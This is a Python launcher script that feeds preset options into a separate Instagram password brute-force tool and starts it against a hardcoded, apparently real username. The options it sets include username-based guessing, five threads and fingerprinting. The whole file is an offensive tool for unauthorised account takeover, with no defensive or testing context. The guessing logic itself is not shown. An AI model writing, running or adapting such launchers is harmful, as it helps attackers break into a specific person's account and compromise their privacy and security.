#!/usr/bin/env python3
"""
Quick launcher for Instagram brute force with predefined target
"""

import os
import sys
import subprocess


def main():
    # Set target username
    target_username = "alx.trading"

    print("🎯 QUICK INSTAGRAM BRUTE FORCE LAUNCHER")
    print(f"📱 Target: {target_username}")
    print("=" * 50)

    # Set environment variables to provide input automatically
    env = os.environ.copy()

    # Create input string for the script
    inputs = [
        target_username,  # Target username
        "y",              # User exists confirmation
        "3",              # Smart generation only (username-based)
        "5",              # Max threads
        "n",              # No proxies
        "n",              # No Selenium
        "n",              # No TOR
        "n",              # No async
        "y",              # Smart mode
        "y",              # Advanced fingerprinting
        "n",              # No CAPTCHA solving
        "n",              # No network scan
        "",               # Press ENTER to start attack
    ]

    input_string = "\n".join(inputs) + "\n"

    try:
        print("🚀 Starting brute force attack...")
        process = subprocess.Popen(
            [sys.executable, "bruteforce_ig.py"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            cwd="/workspaces/sugarglitch-realops/scripts"
        )

        # Send input and get output
        output, _ = process.communicate(input=input_string, timeout=60)
        print(output)

    except subprocess.TimeoutExpired:
        print("⏰ Attack is running in background...")
        process.kill()
        output, _ = process.communicate()
        print(output)
    except Exception as e:
        print(f"❌ Error running attack: {e}")


if __name__ == "__main__":
    main()
